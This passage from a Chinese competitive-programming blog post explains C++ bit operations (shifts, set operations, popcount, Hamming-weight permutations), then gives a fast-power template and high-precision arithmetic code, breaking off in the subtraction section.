位所得的值。</p><p>移位运算中如果出现如下情况，则其行为未定义：</p><ol><li>右操作数（即移位数）为负值；</li><li>右操作数大于等于左操作数的位数；</li></ol><p>例如，对于 <code>int</code> 类型的变量 <code>a</code> ， <code>a&lt;&lt;-1</code> 和 <code>a&lt;&lt;32</code> 都是未定义的。</p><p>对于左移操作，需要确保移位后的结果能被原数的类型容纳，否则行为也是未定义的。[^note1]对一个负数执行左移操作也未定义。[^note2]</p><p>对于右移操作，右侧多余的位将会被舍弃，而左侧较为复杂：对于无符号数，会在左侧补 $0$；而对于有符号数，则会用最高位的数（其实就是符号位，非负数为 $0$，负数为 $1$）补齐。[^note3]</p><h3 id="复合赋值位运算符"><a href="#复合赋值位运算符" class="headerlink" title="复合赋值位运算符"></a>复合赋值位运算符</h3><p>和 <code>+=</code> , <code>-=</code> 等运算符类似，位运算也有复合赋值运算符： <code>&amp;=</code> , <code>|=</code> , <code>^=</code> , <code>&lt;&lt;=</code> , <code>&gt;&gt;=</code> 。（取反是单目运算，所以没有。）</p><h3 id="关于优先级"><a href="#关于优先级" class="headerlink" title="关于优先级"></a>关于优先级</h3><p>位运算的优先级低于算术运算符（除了取反），而按位与、按位或及异或低于比较运算符，所以使用时需多加注意，在必要时添加括号。</p><p>比较需要注意的是，取反(<code>~</code>)和逻辑非(<code>!</code>)的优先级特别高，比如 <code>!a=1</code> <code>!</code> 会优先结合 <code>a</code> 而不会先运算 <code>a=1</code>。其它位运算的优先级又特别低，比如 <code>l+r&gt;&gt;1</code> 可以表示为 <code>(l+r)/2</code>。</p><h3 id="位运算的应用"><a href="#位运算的应用" class="headerlink" title="位运算的应用"></a>位运算的应用</h3><p>位运算一般有三种作用：</p><ol><li><p>高效地进行某些运算，代替其它低效的方式。</p></li><li><p>表示集合。（常用于状压 DP 。）</p></li><li><p>题目本来就要求进行位运算。</p></li></ol><p>需要注意的是，用位运算代替其它运算方式（即第一种应用）在很多时候并不能带来太大的优化，反而会使代码变得复杂，使用时需要斟酌。（但像“乘 2 的非负整数次幂”和“除以 2 的非负整数次幂”就最好使用位运算，因为此时使用位运算可以优化复杂度。）</p><h4 id="有关-2-的幂的应用"><a href="#有关-2-的幂的应用" class="headerlink" title="有关 2 的幂的应用"></a>有关 2 的幂的应用</h4><p>由于位运算针对的是变量的二进制位，因此可以推广出许多与 2 的整数次幂有关的应用。</p><p>将一个数乘（除） 2 的非负整数次幂：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mulPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;  <span class="comment">// 计算 n*(2^m)</span></span><br><span class="line">  <span class="keyword">return</span> n &lt;&lt; m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;  <span class="comment">// 计算 n/(2^m)</span></span><br><span class="line">  <span class="keyword">return</span> n &gt;&gt; m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们平常写的除法是向 $0$ 取整，而这里的右移是向下取整（注意这里的区别），即当数大于等于 $0$ 时两种方法等价，当数小于 $0$ 时会有区别，如： <code>-1 / 2</code> 的值为 $0$ ，而 <code>-1 &gt;&gt; 1</code> 的值为 $-1$ 。</p><p>判断一个数是不是 $2$ 的非负整数次幂：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; (n &amp; (n - <span class="number">1</span>)) == <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>对 $2$ 的非负整数次幂取模：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">modPowerOfTwo</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> mod)</span> </span>&#123; <span class="keyword">return</span> x &amp; (mod - <span class="number">1</span>); &#125;</span><br></pre></td></tr></table></figure><h3 id="模拟集合操作"><a href="#模拟集合操作" class="headerlink" title="模拟集合操作"></a>模拟集合操作</h3><p>一个数的二进制表示可以看作是一个集合（$0$ 表示不在集合中，$1$ 表示在集合中）。比如集合 ${1,3,4,8}$ ，可以表示成 $(100011010)_2$ 。而对应的位运算也就可以看作是对集合进行的操作。</p><table><thead><tr><th>操作</th><th align="center">集合表示</th><th align="center">位运算语句</th></tr></thead><tbody><tr><td>交集</td><td align="center">$a \cap b$</td><td align="center"><code>a &amp; b</code></td></tr><tr><td>并集</td><td align="center">$a \cup b$</td><td align="center">`a</td></tr><tr><td>补集</td><td align="center">$\bar{a}$</td><td align="center"><code>~a</code> （全集为二进制都是 1）</td></tr><tr><td>差集</td><td align="center">$a \setminus b$</td><td align="center"><code>a &amp; (~b)</code></td></tr><tr><td>对称差</td><td align="center">$a\triangle b$</td><td align="center"><code>a ^ b</code></td></tr></tbody></table><p>子集遍历：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历 u 的非空子集</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> s = u; s; s = (s - <span class="number">1</span>) &amp; u) &#123;</span><br><span class="line">  <span class="comment">// s 是 u 的一个非空子集</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用这种方法可以在 $O(2^{\text{popcount}(u)})$ （ $\text{popcount}(u)$ 表示 $u$ 二进制中 1 的个数）的时间复杂度内遍历 $u$ 的子集，进而可以在 $O(3^n)$ 的时间复杂度内遍历大小为 $n$ 的集合的每个子集的子集。（复杂度为 $O(3^n)$ 是因为每个元素都有 不在大子集中/只在大子集中/同时在大小子集中 三种状态。）</p><h3 id="汉明权重"><a href="#汉明权重" class="headerlink" title="汉明权重"></a>汉明权重</h3><p>汉明权重是一串符号中不同于（定义在其所使用的字符集上的）零符号（zero-symbol）的个数。对于一个二进制数，它的汉明权重就等于它 $1$ 的个数（即 <code>popcount</code>）。</p><p>求一个数的汉明权重可以循环求解：我们不断地去掉这个数在二进制下的最后一位（即右移 $1$ 位），维护一个答案变量，在除的过程中根据最低位是否为 $1$ 更新答案。</p><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求 x 的汉明权重</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">popcount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">        cnt += x &amp; <span class="number">1</span>;</span><br><span class="line">        x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求一个数的汉明权重还可以使用 <code>lowbit</code> 操作：我们将这个数不断地减去它的 <code>lowbit</code>[^note4]，直到这个数变为 $0$。</p><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求 x 的汉明权重</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">popcount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">        cnt++; </span><br><span class="line">        x -= x &amp; -x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构造汉明权重递增的排列"><a href="#构造汉明权重递增的排列" class="headerlink" title="构造汉明权重递增的排列"></a>构造汉明权重递增的排列</h4><p>在 <a href="../dp/state.md">状压 DP</a> 中，按照 popcount 递增的顺序枚举有时可以避免重复枚举状态。这是构造汉明权重递增的排列的一大作用。</p><p>下面我们来具体探究如何在 $O(n)$ 时间内构造汉明权重递增的排列。</p><p>我们知道，一个汉明权重为 $n$ 的最小的整数为 $2^n-1$。只要可以在常数时间构造出一个整数汉明权重相等的后继，我们就可以通过枚举汉明权重，从 $2^n-1$ 开始不断寻找下一个数的方式，在 $O(n)$ 时间内构造出 $0\sim n$ 的符合要求的排列。</p><p>而找出一个数 $x$ 汉明权重相等的后继有这样的思路，以 $(10110)_2$ 为例：</p><ul><li><p>把 $(10110)_2$ 最右边的 $1$ 向左移动，如果不能移动，移动它左边的 $1$，以此类推，得到 $(11010)_2$。</p></li><li><p>把得到的 $(11010)_2$ 最后移动的 $1$ 原先的位置一直到最低位的所有 $1$ 都移到最右边。这里最后移动的 $1$ 原来在第三位，所以最后三位 $010$ 要变成 $001$，得到 $(11001)_2$。</p></li></ul><p>这个过程可以用位运算优化：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> t = x + (x &amp; -x);</span><br><span class="line">x = t | ((((t&amp;-t)/(x&amp;-x))&gt;&gt;<span class="number">1</span>)<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><ul><li>第一个步骤中，我们把数 $x$ 加上它的 <code>lowbit</code>，在二进制表示下，就相当于把 $x$ 最右边的连续一段 $1$ 换成它左边的一个 $1$。如刚才提到的二进制数 $(10110)_2$，它在加上它的 <code>lowbit</code> 后是 $(11000)_2$。这其实得到了我们答案的前半部分。</li><li>我们接下来要把答案后面的 $1$ 补齐，$t$  的 <code>lowbit</code> 是 $x$ 最右边连续一段 $1$ 最左边的 $1$ 移动后的位置，而 $x$ 的 <code>lowbit</code> 则是 $x$ 最右边连续一段 $1$ 最左边的位置。还是以 $(10110)_2$ 为例，$t = (11000)_2$，$\operatorname{lowbit}(t) = (01000)_2$，$\operatorname{lowbit}(x)=(00010)_2$。</li><li>接下来的除法操作是这种位运算中最难理解的部分，但也是最关键的部分。我们设<strong>原数</strong>最右边连续一段 $1$ 最高位的 $1$ 在第 $r$  位上（位数从 $0$ 开始），最低位的 $1$ 在第 $l$ 位，$t$ 的 <code>lowbit</code> 等于 <code>1 &lt;&lt; (r+1)</code> ，$x$ 的 <code>lowbit</code> 等于 <code>1 &lt;&lt; l</code>， <code>(((t&amp;-t)/(x&amp;-x))&gt;&gt;1)</code> 得到的，就是 <code>(1&lt;&lt;(r+1))/(1&lt;&lt;l)/2 = (1&lt;&lt;r)/(1&lt;&lt;l) = 1&lt;&lt;(r-l)</code> ，在二进制表示下就是 $1$ 后面跟上 $r-l$ 个零，零的个数正好等于连续 $1$ 的个数减去 $1$ 。举我们刚才的数为例，$\frac{\operatorname{lowbit(t)\div 2}}{\operatorname{lowbit(x)}} = \frac{(00100)_2}{(00010)_2} = (00010)_2$ 。把这个数减去 $1$ 得到的就是我们要补全的低位，或上原来的数就可以得到答案。</li></ul><p>所以枚举 $0\sim n$ 按汉明权重递增的排列的完整代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; (<span class="number">1</span>&lt;&lt;i)<span class="number">-1</span> &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x = (<span class="number">1</span>&lt;&lt;i)<span class="number">-1</span>, t; x &lt;= n; t = x+(x&amp;-x), x = x ? (t|((((t&amp;-t)/(x&amp;-x))&gt;&gt;<span class="number">1</span>)<span class="number">-1</span>)) : (n+<span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="comment">// 写下需要完成的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中要注意 $0$ 的特判，因为 $0$ 没有相同汉明权重的后继。</p><h3 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h3><p>如果需要更大的位数支持可以使用 <code>std::bitset</code>，它的位运算符号被重载过，可以就当一个数来操作。</p><h2 id="快速幂（板子）"><a href="#快速幂（板子）" class="headerlink" title="快速幂（板子）"></a>快速幂（板子）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> base,<span class="keyword">int</span> exp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=base;exp;exp&gt;&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(exp&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans=(ans*k)%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        k=k*k%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高精度运算（板子）"><a href="#高精度运算（板子）" class="headerlink" title="高精度运算（板子）"></a>高精度运算（板子）</h2><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>在平常的实现中，高精度数字利用字符串表示，每一个字符表示数字的一个十进制位。因此可以说，高精度数值计算实际上是一种特别的字符串处理。</p><p>读入字符串时，数字最高位在字符串首（下标小的位置）。但是习惯上，下标最小的位置存放的是数字的 <strong>最低位</strong>，即存储反转的字符串。这么做的原因在于，数字的长度可能发生变化，但我们希望同样权值位始终保持对齐（例如，希望所有的个位都在下标 <code>[0]</code>，所有的十位都在下标 <code>[1]</code>……）；同时，加、减、乘的运算一般都从个位开始进行（回想小学的竖式运算～），这都给了「反转存储」以充分的理由。</p><p>此后我们将一直沿用这一约定。定义一个常数 <code>LEN = 1004</code> 表示程序所容纳的最大长度。</p><p>由此不难写出读入高精度数字的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="comment">// 如上所述，反转</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  <span class="comment">// s[i] - &#x27;0&#x27; 就是 s[i] 所表示的数码</span></span><br><span class="line">  <span class="comment">// 有些同学可能更习惯用 ord(s[i]) - ord(&#x27;0&#x27;) 的方式理解</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出也按照存储的逆序输出。由于不希望输出前导零，故这里从最高位开始向下寻找第一个非零位，从此处开始输出；终止条件 <code>i &gt;= 1</code> 而不是 <code>i &gt;= 0</code> 是因为当整个数字等于 $0$ 时仍希望输出一个字符 <code>0</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">    <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拼起来就是一个完整的复读机程序咯。    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line">    <span class="built_in">print</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h3><p>四则运算中难度也各不相同。最简单的是高精度加减法，其次是高精度—单精度（普通的 <code>int</code>）乘法和高精度—高精度乘法，最后是高精度—高精度除法。</p><p>我们将按这个顺序分别实现所有要求的功能。</p><h4 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h4><p>高精度加法，其实就是竖式加法啦。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/plus.png"></p><p>也就是从最低位开始，将两个加数对应位置上的数码相加，并判断是否达到或超过 $10$。如果达到，那么处理进位：将更高一位的结果上增加 $1$，当前位的结果减少 $10$。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 高精度实现中，一般令数组的最大长度 LEN 比可能的输入大一些</span></span><br><span class="line">  <span class="comment">// 然后略去末尾的几次循环，这样一来可以省去不少边界情况的处理</span></span><br><span class="line">  <span class="comment">// 因为实际输入不会超过 1000 位，故在此循环到 LEN - 1 = 1003 已经足够</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 将相应位上的数码相加</span></span><br><span class="line">    c[i] += a[i] + b[i];</span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="comment">// 进位</span></span><br><span class="line">      c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">      c[i] -= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试着和上一部分结合，可以得到一个加法计算器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN], c[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] + b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">            c[i] -= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line">    <span class="built_in">read</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add</span>(a, b, c);</span><br><span class="line">    <span class="built_in">print</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h4><p>高精度减法，也就是竖式减法啦。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/subtraction.png"></p><p>从个位起逐位相减，遇到负的情况则向上一位借 $1$。整体思路与加法完全一致。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 